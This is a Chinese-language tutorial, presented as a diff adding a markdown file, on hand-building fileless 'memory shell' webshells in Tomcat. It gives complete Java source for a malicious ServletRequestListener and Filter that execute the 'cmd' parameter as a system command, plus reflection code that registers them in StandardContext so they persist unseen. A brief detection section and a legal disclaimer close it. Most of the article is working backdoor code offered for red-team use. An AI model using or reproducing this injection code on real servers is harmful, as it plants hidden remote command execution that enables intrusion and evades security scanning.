@@ -1,0 +1,270 @@
+引言：内存马技术概述
+
+内存马（Memory Shellcode）是一种无文件落地的Webshell技术，通过利用Java Web容器的内部机制，将恶意代码注入到运行中的内存中，从而实现对Web应用的控制。相比传统的文件型Webshell，内存马具有隐蔽性强、存活时间短（重启后消失）、难以被安全软件扫描等优势，因此成为红队攻防中的热门技术。
+
+在Java生态中，Tomcat是最流行的Servlet容器。Tomcat提供了多种扩展点，如Servlet、Filter、Listener等，这些都可以被用来植入内存马。本文将从原理到实战，深入剖析如何“手搓”Tomcat下的Listener内存马和Filter内存马，通过反射动态注册恶意组件，实现命令执行。文章将结合断点调试与源码分析，帮助读者理解Tomcat内部的数据结构，并掌握内存马注入的核心技巧。
+
+1. 前置知识：Tomcat核心组件与上下文关系
+
+在动手之前，我们需要了解Tomcat的几个关键类：
+
+· ServletContext：Servlet上下文接口，每个Web应用对应一个ServletContext，用于与容器通信。
+· ApplicationContext：Tomcat对ServletContext的实现类，内部包装了StandardContext。
+· StandardContext：Tomcat的核心容器类，代表一个Web应用，管理着Servlet、Filter、Listener等所有组件。它持有filterDefs、filterConfigs、filterMaps、applicationEventListeners等关键集合。
+· Listener与Filter的工作原理：
+  · Listener（如ServletRequestListener）监听Web事件，在请求初始化/销毁时触发。StandardContext中维护了一个ApplicationEventListeners列表，当事件发生时，容器会遍历并调用对应的监听器方法。
+  · Filter通过过滤器链对请求进行拦截。StandardContext中通过filterDefs（存储Filter定义）、filterMaps（存储URL映射关系）和filterConfigs（存储Filter配置实例）共同管理Filter。
+
+内存马的本质就是利用反射，将我们自定义的恶意Listener或Filter动态添加到这些内部集合中，使其生效。
+
+2. Listener内存马：手搓ServletRequestListener
+
+2.1 恶意Listener的编写
+
+首先，我们创建一个实现了ServletRequestListener接口的恶意类。在requestInitialized方法中，我们判断请求URI是否包含特定路径（如/xiaodi），若命中则从请求参数中获取cmd并执行系统命令。
+
+```java
+import javax.servlet.ServletRequestEvent;
+import javax.servlet.ServletRequestListener;
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+
+public class TestListen implements ServletRequestListener {
+    @Override
+    public void requestInitialized(ServletRequestEvent sre) {
+        System.out.println("requestInitialized");
+        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
+        String uri = req.getRequestURI();
+        if (uri.contains("/xiaodi")) {
+            String cmd = req.getParameter("cmd");
+            try {
+                Runtime.getRuntime().exec(cmd);
+            } catch (IOException e) {
+                throw new RuntimeException(e);
+            }
+        }
+        // 调用父类方法（可省略）
+        ServletRequestListener.super.requestInitialized(sre);
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+        // 可留空
+    }
+}
+```
+
+在传统配置中，我们需要在web.xml中注册该监听器：
+
+```xml
+<listener>
+    <listener-class>org.example.testlisten.TestListen</listener-class>
+</listener>
+```
+
+但作为内存马，我们要通过反射动态添加，避免文件落地。
+
+2.2 断点调试：定位关键数据结构
+
+为了找到动态添加监听器的入口，我们可以在requestInitialized方法中下断点，观察调用栈。通过跟踪会发现，Tomcat在处理请求时会经过StandardContext，最终调用ApplicationContext的fireRequestInitialized方法，该方法遍历applicationEventListeners列表并逐个触发。这个列表正是存储在StandardContext中的applicationEventListeners字段。
+
+因此，我们只需要获取当前Web应用的StandardContext对象，然后调用其addApplicationEventListener方法，将我们的恶意监听器实例添加进去即可。
+
+2.3 反射注入Listener内存马
+
+注入流程分为三步：
+
+1. 从当前请求获取ServletContext。
+2. 通过反射获取ServletContext内部的ApplicationContext，进而得到StandardContext。
+3. 调用StandardContext.addApplicationEventListener注册恶意监听器。
+
+代码如下：
+
+```java
+import javax.servlet.ServletContext;
+import javax.servlet.http.HttpServletRequest;
+import java.lang.reflect.Field;
+
+public void injectListener(HttpServletRequest request) throws Exception {
+    // 1. 获取ServletContext
+    ServletContext servletContext = request.getServletContext();
+
+    // 2. 反射获取ApplicationContext中的context字段（即StandardContext）
+    Field appctxField = servletContext.getClass().getDeclaredField("context");
+    appctxField.setAccessible(true);
+    // org.apache.catalina.core.ApplicationContext
+    Object applicationContext = appctxField.get(servletContext);
+
+    Field stdctxField = applicationContext.getClass().getDeclaredField("context");
+    stdctxField.setAccessible(true);
+    // org.apache.catalina.core.StandardContext
+    StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext);
+
+    // 3. 创建恶意监听器实例并添加到StandardContext
+    TestListen listener = new TestListen();
+    standardContext.addApplicationEventListener(listener);
+}
+```
+
+注意：StandardContext类位于org.apache.catalina.core包，需要在代码中导入，或者通过反射调用addApplicationEventListener方法。上述代码假设可以直接使用StandardContext类型，实际利用时往往全反射调用。
+
+注入成功后，后续任何请求都会经过TestListen的requestInitialized方法，当访问/xiaodi?cmd=whoami时即可执行命令。
+
+3. Filter内存马：手搓恶意Filter
+
+Filter是更常用的Web组件，因为它可以拦截指定URL，控制粒度更细。动态注册Filter稍微复杂一些，需要操作filterDefs、filterMaps和filterConfigs三个核心集合。
+
+3.1 恶意Filter的编写
+
+实现javax.servlet.Filter接口，在doFilter方法中植入命令执行逻辑：
+
+```java
+import javax.servlet.*;
+import javax.servlet.http.HttpServletRequest;
+import java.io.IOException;
+
+public class TestFilter implements Filter {
+    @Override
+    public void init(FilterConfig filterConfig) {
+        System.out.println("TestFilter init");
+    }
+
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+        System.out.println("TestFilter doFilter");
+        HttpServletRequest req = (HttpServletRequest) request;
+        String uri = req.getRequestURI();
+        if (uri.contains("/xiaodi")) {
+            String cmd = req.getParameter("cmd");
+            Runtime.getRuntime().exec(cmd);
+        }
+        // 放行请求
+        chain.doFilter(request, response);
+    }
+
+    @Override
+    public void destroy() {
+        System.out.println("TestFilter destroy");
+    }
+}
+```
+
+传统配置需要两步：声明Filter和映射URL。
+
+```xml
+<filter>
+    <filter-name>TestFilter</filter-name>
+    <filter-class>org.example.testfilter.TestFilter</filter-class>
+</filter>
+<filter-mapping>
+    <filter-name>TestFilter</filter-name>
+    <url-pattern>/*</url-pattern>
+</filter-mapping>
+```
+
+3.2 调试分析：Filter的三个核心集合
+
+通过断点调试，我们可以观察到StandardContext中有三个重要的Map/List：
+
+· filterDefs：HashMap<String, FilterDef>，键为Filter名称，值为FilterDef对象，包含Filter的类名、名称等信息。
+· filterMaps：List<FilterMap>，每个FilterMap记录了一个Filter名称与URL模式的映射关系。
+· filterConfigs：HashMap<String, ApplicationFilterConfig>，键为Filter名称，值为ApplicationFilterConfig对象，该对象包装了Filter实例和FilterDef。
+
+当一个请求到达时，Tomcat会根据filterMaps匹配URL，找到对应的Filter名称，然后从filterConfigs中获取对应的ApplicationFilterConfig，进而得到Filter实例，构建过滤器链。
+
+因此，动态注册Filter需要完成以下工作：
+
+1. 创建FilterDef对象，设置名称、类名及Filter实例。
+2. 将FilterDef添加到StandardContext.filterDefs中。
+3. 创建FilterMap对象，设置Filter名称和URL模式，并添加到filterMaps中（注意顺序，可使用addFilterMapBefore添加到现有映射之前）。
+4. 创建ApplicationFilterConfig对象，包装FilterDef和StandardContext，并放入filterConfigs中。
+
+3.3 反射注入Filter内存马
+
+下面给出完整的注入代码：
+
+```java
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.ApplicationFilterConfig;
+import org.apache.catalina.core.StandardContext;
+import org.apache.tomcat.util.descriptor.web.FilterDef;
+import org.apache.tomcat.util.descriptor.web.FilterMap;
+
+import javax.servlet.ServletContext;
+import javax.servlet.http.HttpServletRequest;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.util.Map;
+
+public void injectFilter(HttpServletRequest request) throws Exception {
+    // 1. 获取StandardContext（与Listener相同）
+    ServletContext servletContext = request.getServletContext();
+    Field appctxField = servletContext.getClass().getDeclaredField("context");
+    appctxField.setAccessible(true);
+    ApplicationContext applicationContext = (ApplicationContext) appctxField.get(servletContext);
+
+    Field stdctxField = applicationContext.getClass().getDeclaredField("context");
+    stdctxField.setAccessible(true);
+    StandardContext standardContext = (StandardContext) stdctxField.get(applicationContext);
+
+    // 2. 获取filterConfigs
+    Field configsField = standardContext.getClass().getDeclaredField("filterConfigs");
+    configsField.setAccessible(true);
+    Map filterConfigs = (Map) configsField.get(standardContext);
+
+    // 3. 定义Filter名称（确保唯一性）
+    String filterName = "MaliciousFilter";
+
+    // 4. 创建Filter实例
+    TestFilter filter = new TestFilter();
+
+    // 5. 创建FilterDef并设置属性
+    FilterDef filterDef = new FilterDef();
+    filterDef.setFilterName(filterName);
+    filterDef.setFilterClass(filter.getClass().getName());
+    filterDef.setFilter(filter); // 设置实例，可选，但后续构造ApplicationFilterConfig需要
+    // 将FilterDef添加到standardContext
+    standardContext.addFilterDef(filterDef);
+
+    // 6. 创建FilterMap并设置映射（拦截所有请求）
+    FilterMap filterMap = new FilterMap();
+    filterMap.setFilterName(filterName);
+    filterMap.addURLPattern("/*");
+    filterMap.setDispatcher(DispatcherType.REQUEST.name());
+    standardContext.addFilterMapBefore(filterMap); // 插入到最前面，确保优先执行
+
+    // 7. 创建ApplicationFilterConfig并放入filterConfigs
+    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(StandardContext.class, FilterDef.class);
+    constructor.setAccessible(true);
+    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
+    filterConfigs.put(filterName, filterConfig);
+}
+```
+
+注入后，恶意Filter将立即生效，所有请求都会经过其doFilter方法，当URI包含/xiaodi时执行命令。
+
+4. 原理深化：为何这样能生效？
+
+· Listener：StandardContext在启动时会从applicationEventListeners列表构建监听器。动态添加后，后续事件触发时，容器会遍历该列表并调用监听器方法。ServletRequestListener的requestInitialized在每次请求开始时被调用，因此可达到命令执行的目的。
+· Filter：StandardContext的filterMaps和filterConfigs用于构建过滤器链。我们手动添加FilterDef并创建ApplicationFilterConfig放入filterConfigs，同时将FilterMap加入映射列表，使得请求匹配时能够找到对应的Filter实例。需要注意的是，filterConfigs中的键值必须与FilterDef中的名称一致，并且FilterDef也需要先添加到StandardContext中，因为ApplicationFilterConfig构造时会引用它。
+
+这两个注入过程都依赖于Tomcat的反射操作，因此需要注意不同Tomcat版本间的字段名差异（例如filterConfigs字段名在不同版本可能不同，但核心逻辑相似）。
+
+5. 防御与检测思路
+
+内存马无文件落地，检测难度较大，但仍有迹可循：
+
+1. 基于行为检测：内存马通常会在特定路径下执行命令，可监控请求日志，发现异常的URI和参数（如cmd、exec等）。
+2. JVM内存分析：通过分析JVM堆内存，查找是否存在恶意类。例如，使用jmap dump堆，然后用MAT等工具分析，寻找可疑的Filter或Listener实例。
+3. JMX MBean监控：Tomcat通过JMX暴露了Web应用的部分内部状态，可以监控filterConfigs的变化，发现非预期的Filter。
+4. 防护措施：
+   · 使用安全管理器（SecurityManager）限制反射操作。
+   · 对Tomcat内部关键类进行完整性校验，如StandardContext的字段是否被篡改。
+   · 部署RASP（运行时应用自我保护）产品，在关键API处（如Runtime.exec）进行拦截。
+
+结语
+
+本文详细介绍了如何在Tomcat中动态注入ServletRequestListener内存马和Filter内存马，从编写恶意代码、断点调试到反射注入，层层递进。通过理解Tomcat的内部数据结构，我们可以灵活地扩展这些技术，甚至结合JSP、WebSocket等更多组件实现更隐蔽的内存马。希望读者通过本文，既能掌握攻防实战技巧，也能加深对Java Web容器运行机制的理解。
+
+注意：本文内容仅供安全研究和学习使用，严禁用于非法攻击。在实际攻防演练中，请遵守相关法律法规。
